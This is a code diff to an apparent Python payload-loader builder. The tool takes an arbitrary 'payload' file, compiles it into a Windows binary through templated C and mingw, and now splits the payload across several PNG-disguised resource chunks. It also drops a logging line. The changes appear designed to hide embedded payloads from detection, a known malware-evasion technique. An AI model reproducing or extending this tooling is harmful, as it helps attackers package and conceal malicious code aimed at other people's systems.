@@ -5,6 +5,7 @@ import uuid
 import importlib
 import random
 from jinja2 import Environment, FileSystemLoader
+from .png_chunker import chunk_bytecode_to_pngs
 
 def _djb2_hash(s):
     """Calculates the DJB2 hash for a given string."""
@@ -72,7 +73,7 @@ def _prepare_template_context(options, input_filepath):
     data_source_choice = options.get('data_source', 'embedded')
     template_vars['data_source'] = data_source_choice
     if data_source_choice == 'embedded':
-        template_vars['data_source_partial'] = "partials/datasource_resource.c.j2"
+        template_vars['data_source_partial'] = "partials/datasource_image_chunks.c.j2"
     else:
         template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
     
@@ -116,15 +117,13 @@ def _prepare_template_context(options, input_filepath):
     
     return template_vars
 
-def _compile_resource(payload_bytes, temp_files_to_clean):
-    """Compiles embedded payload into a resource object file and returns the path."""
-    temp_bin_filename = f"{uuid.uuid4()}.bin"
-    temp_bin_filepath = os.path.join('/tmp/uploads', temp_bin_filename)
-    temp_files_to_clean.append(temp_bin_filepath)
-    with open(temp_bin_filepath, "wb") as f_bin:
-        f_bin.write(payload_bytes)
-
-    rc_content = f'101 RCDATA "{temp_bin_filename}"'
+def _compile_png_resources(payload_bytes, temp_files_to_clean):
+    """Compiles embedded payload into multiple PNG resource object files."""
+    png_files = chunk_bytecode_to_pngs(payload_bytes, temp_files_to_clean)
+    rc_content = ""
+    for i, png_file in enumerate(png_files):
+        rc_content += f'im{i} RCDATA "{png_file}"\n'
+    
     temp_rc_filename = f"{uuid.uuid4()}.rc"
     temp_rc_filepath = os.path.join('/tmp/uploads', temp_rc_filename)
     temp_files_to_clean.append(temp_rc_filepath)
@@ -135,7 +134,6 @@ def _compile_resource(payload_bytes, temp_files_to_clean):
     temp_res_o_filepath = os.path.join('/tmp/uploads', temp_res_o_filename)
     temp_files_to_clean.append(temp_res_o_filepath)
     windres_command = ["x86_64-w64-mingw32-windres", "-i", temp_rc_filepath, "-o", temp_res_o_filepath]
-    print(f"INFO: Compiling resource object with command: {' '.join(windres_command)}")
     subprocess.run(windres_command, check=True, capture_output=True, text=True, cwd='/tmp/uploads')
     
     return temp_res_o_filepath
@@ -191,7 +189,6 @@ def _link_objects(object_files, options, original_filename, temp_files_to_clean)
     
     return output_artifact_filename
 
-
 def encode(input_filepath, original_filename, options):
     """
     Orchestrates the dynamic generation and compilation of the program.
@@ -212,14 +209,13 @@ def encode(input_filepath, original_filename, options):
         c_object_path = _compile_c_source(c_source_code, temp_files_to_clean)
         object_files_to_link = [c_object_path]
         
-        # If using an embedded data source, compile the payload into a resource object file (Saves compilation time)
+        # If using embedded data source, compile the payload into PNG resource object files
         if options.get('data_source') == 'embedded':
             with open(input_filepath, "rb") as f:
                 payload_bytes = f.read()
-            resource_object_path = _compile_resource(payload_bytes, temp_files_to_clean)
+            resource_object_path = _compile_png_resources(payload_bytes, temp_files_to_clean)
             object_files_to_link.append(resource_object_path)
             
-        # Link all generated object files into the final binary
         final_artifact_name = _link_objects(
             object_files_to_link, options, original_filename, temp_files_to_clean
         )
